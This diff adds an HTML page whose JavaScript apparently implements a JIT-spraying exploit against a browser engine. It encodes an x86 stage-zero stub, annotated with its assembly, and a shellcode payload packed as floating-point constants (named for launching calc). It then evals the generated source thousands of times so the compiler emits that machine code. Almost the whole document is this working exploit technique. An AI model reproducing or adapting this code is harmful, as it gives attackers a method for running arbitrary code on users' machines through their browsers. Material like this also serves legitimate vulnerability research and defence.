@@ -1,0 +1,103 @@
+<html>
+
+<script>
+
+    function hex(x){
+        var y = x.toString(16);
+        y = "0x"+y;
+        return y;
+    }
+
+    //there are issues with signed ints -_-'
+    function swap32(val) {
+        var x = ((val & 0xFF) << 24) | ((val & 0xFF00) << 8) | ((val >> 8) & 0xFF00) | ((val >> 24) & 0xFF);
+        x = x>>>0;
+        return x;
+    }
+
+    function make_tab(shellcode){
+        var i;
+        var t = [];
+        for(i=0;i<0x1D;i++){
+            t[i] = hex(i);
+        }
+
+        var stage0 = [
+            0x005deb15,  //last byte of call $+5
+                         //pop ebp
+                         //jmp
+            0x31d2eb15, //xor edx, edx 
+            0xb219eb15, //mov dl, 19h 
+            0x31dbeb15, //xor ebx, ebx
+            0xb304eb15, //mov bl, 4
+            0x31c9eb15, //xor ecx, ecx
+            0x89efeb15, //mov edi, ebp
+            0x29dfeb15, //sub edi, ebx
+            0x4f90eb15, //dec edi / nop
+            0x31c0eb15, //xor eax, eax
+            0xb016eb15, //xor al, 16h
+            0xf7e2eb15, //mul edx
+            0x01c7eb15, //add edi, eax
+            0xb219eb15, //mov dl, 19h 
+                        //@@:
+            0x890feb15, //mov [edi], ecx
+            0x01d7eb15, //add edi, edx
+            0x00d9eb15, //add cl, bl
+            0x75b3eb15, //jnz @b
+
+            0x01dfeb15, //add edi, ebx
+            0x01dfeb15, //add edi, ebx
+            0x89e8eb15, //mov eax, ebp
+
+            0x8978244f, //mov dword [eax+24h], edi / dec edi (not a nop, because of problems with signed ints)
+        ];
+        
+        for(i=0;i<stage0.length;i++){
+            var x = stage0[i];
+            x = swap32(x);
+            x = hex(x);
+            t.push(x);
+        }
+
+        for(i=0;i<shellcode.length;i++){
+            x = shellcode[i];
+            y = x;
+            t.push(y);
+        }
+
+        t.push("/test/");
+        var s = t.join();
+        s = "var vals = ["+s+"];";
+        return s;
+    }
+
+    function make_src(gtab_name, shellcode){
+        var s = make_tab(shellcode);
+        //s = s + "\n" + "for (var i in vals) {document.write(vals[i]); document.write(\" \");}";
+        s = s + "\n" + "for (var i in vals) {var x = vals[i]; }; ";
+        s = "var f = function (){" + s + "}; " + gtab_name + ".push(f);";
+        return s;
+    }
+
+    var nop = 1.1983035052072696e-314;  //0x00000000 90909090
+    
+    var calc_shellcode = [8.31720345743e-315,1.15374659167e-314,9.82609703945e-315,6.98916626117e-316,7.75388875052e-315,2.43378822098e-315,1.15978667314e-314,1.88495157374e-314,2.692497989e-315,1.03237263363e-314,1.98114633087e-314,4.1943061163e-315,1.68064937984e-314,2.05120473767e-314,1.40735874895e-315,9.7716451506e-315,3.01110803878e-315,1.51741071199e-314,1.02406272763e-314,3.26058800837e-316,3.84682663991e-315,8.6534630538e-315,8.24124818644e-315,2.98552290859e-315,1.69789443341e-314];
+
+    calc_shellcode.unshift(nop);    //marker 
+    calc_shellcode.push(nop);       //marker
+
+    document.write(calc_shellcode);
+
+    var gtab = [];
+    var src = make_src("gtab", calc_shellcode);
+    for(i=0;i<(1<<14);i++){
+        eval(src);
+        var g = gtab[i];
+        var x = g();
+    }
+    alert("ok");
+    //while(1){};
+
+</script>
+
+</html>
